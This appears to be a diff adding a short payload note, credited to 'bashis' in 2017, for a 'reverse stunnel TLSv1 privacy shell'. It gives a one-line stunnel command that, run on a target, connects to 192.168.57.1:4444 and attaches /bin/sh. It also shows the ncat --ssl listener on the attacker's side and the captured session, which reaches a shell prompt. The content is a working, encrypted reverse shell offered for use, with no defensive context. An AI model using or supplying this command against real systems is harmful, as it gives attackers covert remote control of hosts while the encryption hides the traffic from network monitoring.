@@ -1,0 +1,21 @@
+
+// bashis <mcw noemail eu> 2017
+
+Reverse stunnel TLSv1 privacy shell
+
+[RHOST]
+echo -en "client=yes\x0aconnect=192.168.57.1:4444\x0aexec=/bin/sh\x0apty=yes\x0asslVersion=TLSv1"|stunnel -fd 0
+
+[LHOST]
+$ ncat -vlp 4444 --ssl
+Ncat: Version 7.60 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 42B5 6774 07D3 00C3 BBF4 9D76 8154 FC1E 6364 A403
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.57.20.
+Ncat: Connection from 192.168.57.20:58145.
+/bin/sh: can't access tty; job control turned off
+/ # 
+/ # exit
+$
